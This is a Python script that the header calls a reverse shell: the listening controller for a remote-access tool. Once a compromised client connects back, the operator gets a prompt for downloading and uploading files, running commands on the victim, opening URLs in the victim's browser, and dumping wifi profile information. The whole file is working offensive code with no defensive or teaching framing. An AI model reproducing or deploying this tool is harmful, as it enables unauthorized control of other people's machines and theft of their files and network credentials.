#!/usr/bin/env python
# Created by ybenel
# A Revershell Made In Python For Linux/Windows
import socket,struct,sys,os
from datetime import datetime
from random import randint
try:
	input = raw_input
except NameError:
	input = input
# Colrs
cyan = "\033[1;36m"
red = "\033[1;31m"
green = "\033[38;5;82m"
yellow = "\033[1;33m"
white = "\033[39m"
reset = "\033[0m"
blue = "\033[1;34m"
purple = "\033[1;35m"
#
class sen_res:
	def __init__(self,sock):
		self.sock = sock
	def send(self,data):
		bak = struct.pack('>I', len(data)) + data
		self.sock.sendall(bak)
	def recv(self):
		baklen = self.recvall(4)
		if not baklen:
			return ""
		baklen = struct.unpack('>I', baklen)[0]
		return self.recvall(baklen)
	def recvall(self, n):
		packet = b''
		while len(packet) < n:
			frame = self.sock.recv(n - len(packet))
			if not frame:return None
			packet += frame
		return packet
def help():
	print(green + """
| ------------------ | -----------------------------------------|
[      Commands      |                Description               ]
| ------------------ | -----------------------------------------|
|       help         | Display Help Menu                        |
|       check        | Check If Client Is Connected To Internet |
|       kill         | Kill connection with client              |
|       download     | Download Files From Client               |
|       upload       | Upload Files To Client 		        |
|       browse 	     | Browse An Url In Client Browser          |
|       exec         | Execute A Sudo Command 			|
|	pwd	     | Show Current Directory			|
|	cd 	     | Browse To A Directory		        |
| ------------------ | -----------------------------------------|
""" + reset)
def download(file):
  cmd = file
  file = "".join(file.split("download")).strip()
  if file.strip():
   filetodown = file.split("/")[-1] if "/" in file else file.split("\\")[-1] if "\\" in file else file
   controler.send(cmd.encode("UTF-8"))
   down = controler.recv().decode("UTF-8",'ignore')
   if down == "true":
     print(green + "[+] Downloading [ {} ]....".format(filetodown) + reset)
     wf = open(filetodown, "wb")
     while True:
      data = controler.recv()
      if data == b"Done": break
      elif data == b"Aborted":
        wf.close()
        os.remove(filetodown)
        print(red + "[!] Download Has Been Aborted By Client!" + reset)
        return
      wf.write(data)
     wf.close()
     print(purple + "[+] Download Completed!\n[+] File Saved In {}\n".format(os.getcwd()+os.sep+filetodown) + reset)
   else: print(down)
  else: print(yellow + "Usage: download <file_to_download> " + reset)
def upload(cmd):
	filetoup = ''.join(cmd.split('upload')).strip()
	if not filetoup.strip():
		print(yellow + "Usage: upload <filet_to_upload> "+ reset)
	else:
		if not os.path.isfile(filetoup):
			print(red + "Error: No Such File: "+ filetoup+"\n"+reset)
		else:
			controler.send(cmd.encode('utf-8'))
			print(cyan + "[+] Uploading [ {} ]...".format(filetoup) + reset)
			with open(filetoup, "rb") as wf:
				for data in iter(lambda: wf.read(4100), b""):
					try:
						controler.send(data)
					except(KeyboardInterrupt,EOFError):
						wf.close()
						controler.send(b"Aborted")
						print(red + "Uploading Has been aborted by User!\n" + reset)
						return
			controler.send(b"Done")
			savedpath = controler.recv().decode('utf-8')
			print(cyan + "Upload Completed\n[+] File Uploaded in : "+str(savedpath).strip()+" in client machine\n"+ reset)
def check_con():
	print(green + "[+] Checking ..." + reset)
	controler.send(b"check_internet")
	status = controler.recv().decode('utf-8').strip()
	if status == "UP":
		print(cyan + "[+] Client Is Connected To Internet\n" + reset)
	else:
		print(red + "[!] Client Is Not Connected to Internet!\n" + reset)
def browse(cmd):
	url = ''.join(cmd.split("browse")).strip()
	if not url.strip():
		print(yellow + "Usage: browse <website url> \n" + reset)
	else:
		if not url.startswith(("https://", "http://")):
			url = "http://"+url
		print(blue + "[+] Opening [ {} ] ".format(url) + reset)
		controler.send("browse {}".format(url).encode('utf-8'))
		print(purple + '[+] Done \n' + reset)
def control():
	try:
		cmd = str(input("[{}]:~# ".format(a[0])))
		while not cmd.strip():
			cmd = str(input("[{}]:~# ".format(a[0])))
		if cmd == "help":
			help()
			control()
		elif "download" in  cmd:
			download(cmd)
			control()
		elif "upload" in  cmd:
			upload(cmd)
			control()
		elif "kill" in  cmd:
			print(red + "[!] Connection Has Been Killed!" + reset)
			controler.send(b'kill')
			b.shutdown(2)
			b.close()
			y.close()
			exit(1)
		elif "exec" in  cmd:
			cmd = ''.join(cmd.split('exec')).strip()
			if not cmd.strip():
				print(blue + "Usage: exec <command> \n" + reset)
			else:
				print(yellow + "[+] exec" + reset)
				os.system(cmd)
				print(" ")
			control()
		elif "check" in  cmd:
			check_con()
			control()
		elif "wifi" in  cmd:
			print(blue + "[+] Getting Wifi Profiles info ..." + reset)
			controler.send(b'wifi')
			info = controler.recv()
			try:
				info = info.decode('utf-8', 'ignore')
			except UnicodeEncodeError:
				info = info
			finally:
				if info == "osnot":
					print(red + "[!] Sorry I couldn't find any wifi info\n"+blue+"[+] Maybe You Don't Have Privilege To View The info \n"+green+"[+] Check If You're Root User\n" + reset)
				else:
					print(cyan + "[+] Info: \n")
					print(info + "\n")
					control()
		elif "browse" in cmd:
			browse(cmd)
			control()
		elif cmd.lower() == "cls" or cmd == "clear":
			os.system("cls||clear")
			control()
		controler.send(cmd.encode('utf-8'))
		datta = controler.recv()
		if datta.strip():
			print(datta.decode('utf-8', 'ignore'))
		control()
	except (KeyboardInterrupt, EOFError):
		print(" ")
		control()
	except socket.error:
		print(red + "[!] Connection Lost To: "+a[0]+"! \n" + reset)
		b.close()
		y.close()
		exit(1)
	except UnicodeEncodeError:
		print(datta)
		print(" ")
		control()
	except Exception as e:
		print(red + "[!] An Error Occurred: "+str(e)+ "\n" + reset)
		control()
def server(ip,port, sen_res=sen_res):
	global y
	global b
	global a
	global controler
	y = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	y.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	y.bind((ip, port))
	y.listen(1)
	print(yellow + "[+] Server Started On {}:{} < at [{}]".format(ip, port,datetime.now().strftime("%H:%M:%S")) + reset)
	try:
		b,a = y.accept()
		controler = sen_res(b)
		print(blue + "\n[+] Connection From {}:{}".format(a[0], a[1]) + reset)
		print(green + "[+] Type help to show help menu\n" + reset)
		control()
	except (KeyboardInterrupt, EOFError):
		print(" ")
		exit(1)
if len(sys.argv) != 3:
	print(white + "Usage: python server.py <ip> <port>" + reset)
	exit(1)
server(sys.argv[1], int(sys.argv[2]))
